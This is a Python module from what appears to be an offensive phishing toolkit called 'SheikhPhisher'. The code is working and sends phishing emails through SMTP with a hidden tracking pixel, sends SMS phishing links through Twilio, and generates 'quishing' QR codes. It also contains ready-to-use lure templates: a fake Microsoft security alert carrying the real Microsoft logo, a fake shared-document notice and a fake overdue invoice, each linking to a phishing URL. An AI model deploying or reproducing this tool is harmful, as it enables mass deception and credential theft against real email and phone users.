#!/usr/bin/env python3
# modules/delivery.py - SheikhPhisher Delivery Engine
# Email (SMTP), SMS (Twilio), QR Code delivery

import os, json, smtplib, logging, random, string
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from urllib.parse import urlparse

log = logging.getLogger(__name__)

class DeliveryEngine:
    """Multi-channel phishing delivery"""
    
    def __init__(self, config):
        self.config = config
        self.smtp_config = config.get('delivery', {}).get('smtp', {})
        self.twilio_config = config.get('delivery', {}).get('twilio', {})
        self.webhook_url = config.get('delivery', {}).get('webhook', {}).get('url', '')
    
    def send_email(self, to_addr, from_addr, subject, html_body, attachments=None, tracking_id=None):
        """Send phishing email via SMTP"""
        msg = MIMEMultipart('alternative')
        msg['From'] = from_addr
        msg['To'] = to_addr
        msg['Subject'] = subject
        
        # Add tracking pixel if ID provided
        if tracking_id:
            tracking_pixel = f'<img src="https://phish-track.example.com/t/{tracking_id}" width="1" height="1" style="display:none"/>'
            html_body = html_body.replace('</body>', f'{tracking_pixel}</body>')
        
        msg.attach(MIMEText(html_body, 'html'))
        
        if attachments:
            for att in attachments:
                with open(att, 'rb') as f:
                    part = MIMEImage(f.read())
                    part.add_header('Content-Disposition', 'attachment', filename=os.path.basename(att))
                    msg.attach(part)
        
        try:
            server = smtplib.SMTP(self.smtp_config['host'], self.smtp_config['port'])
            server.ehlo()
            if self.smtp_config.get('use_tls', True):
                server.starttls()
                server.ehlo()
            if self.smtp_config.get('username'):
                server.login(self.smtp_config['username'], self.smtp_config['password'])
            server.sendmail(from_addr, [to_addr], msg.as_string())
            server.quit()
            log.info(f"[EMAIL] Sent to {to_addr} from {from_addr}")
            return True
        except Exception as e:
            log.error(f"[EMAIL] Failed to send to {to_addr}: {e}")
            return False
    
    def send_sms(self, to_number, message, phishing_url=None):
        """Send SMS phishing via Twilio"""
        if not self.twilio_config.get('account_sid'):
            log.warning("[SMS] Twilio not configured")
            return False
        
        try:
            from twilio.rest import Client
            client = Client(self.twilio_config['account_sid'], self.twilio_config['auth_token'])
            
            body = message
            if phishing_url:
                body += f'\n{phishing_url}'
            
            resp = client.messages.create(
                body=body,
                from_=self.twilio_config['from_number'],
                to=to_number
            )
            log.info(f"[SMS] Sent to {to_number}: {resp.sid}")
            return True
        except Exception as e:
            log.error(f"[SMS] Failed to send to {to_number}: {e}")
            return False
    
    def generate_qr(self, url, output_path='./payloads/qr_phish.png'):
        """Generate QR code for quishing attacks"""
        try:
            import qrcode
            qr = qrcode.QRCode(version=1, box_size=10, border=5)
            qr.add_data(url)
            qr.make(fit=True)
            img = qr.make_image(fill_color="black", back_color="white")
            img.save(output_path)
            log.info(f"[QR] QR code saved to {output_path}")
            return output_path
        except ImportError:
            log.error("[QR] qrcode module not installed. Run: pip install qrcode[pil]")
            return None
    
    def generate_email_template(self, template_type='urgent_security'):
        """Generate common phishing email templates"""
        templates = {
            'urgent_security': {
                'subject': 'Urgent: Unauthorized sign-in attempt detected',
                'body': '''
<html><body style="font-family: Arial; background-color: #f5f5f5; padding: 20px;">
<div style="max-width: 600px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
<div style="text-align: center; margin-bottom: 20px;">
<img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" style="height: 40px;" alt="Microsoft">
</div>
<h2 style="color: #d32f2f;">Suspicious sign-in attempt detected</h2>
<p>We detected an unusual sign-in attempt from <strong>{{location}}</strong> using <strong>{{device}}</strong>.</p>
<p>If this wasn't you, your account may be compromised. Please verify your identity immediately.</p>
<div style="text-align: center; margin: 30px 0;">
<a href="{{phishing_url}}" style="background: #0066ff; color: white; padding: 14px 32px; text-decoration: none; border-radius: 4px; font-weight: bold; display: inline-block;">Review recent activity</a>
</div>
<p style="color: #888; font-size: 12px;">This is an automated security notification. Please do not reply.</p>
</div></body></html>
'''
            },
            'document_shared': {
                'subject': '{{sender}} shared a document with you',
                'body': '''
<html><body style="font-family: Arial;">
<div style="max-width: 600px; margin: 0 auto; padding: 20px;">
<p>{{sender}} has invited you to view the following document:</p>
<div style="border: 1px solid #ddd; padding: 20px; border-radius: 8px; margin: 20px 0;">
<h3>{{document_name}}</h3>
<p style="color: #888;">{{description}}</p>
</div>
<div style="text-align: center;">
<a href="{{phishing_url}}" style="background: #00a82d; color: white; padding: 12px 28px; text-decoration: none; border-radius: 4px; font-weight: bold;">Open Document</a>
</div>
</div></body></html>
'''
            },
            'invoice': {
                'subject': 'Invoice {{invoice_number}} - Payment Overdue',
                'body': '''
<html><body style="font-family: Arial;">
<div style="max-width: 600px; margin: 0 auto; padding: 20px;">
<h2>Invoice {{invoice_number}}</h2>
<p>Dear customer,</p>
<p>Your invoice of <strong>${{amount}}</strong> is now overdue. Please pay immediately to avoid service interruption.</p>
<div style="text-align: center; margin: 30px 0;">
<a href="{{phishing_url}}" style="background: #d32f2f; color: white; padding: 12px 28px; text-decoration: none; border-radius: 4px; font-weight: bold;">View Invoice & Pay</a>
</div>
</div></body></html>
'''
            }
        }
        return templates.get(template_type, templates['urgent_security'])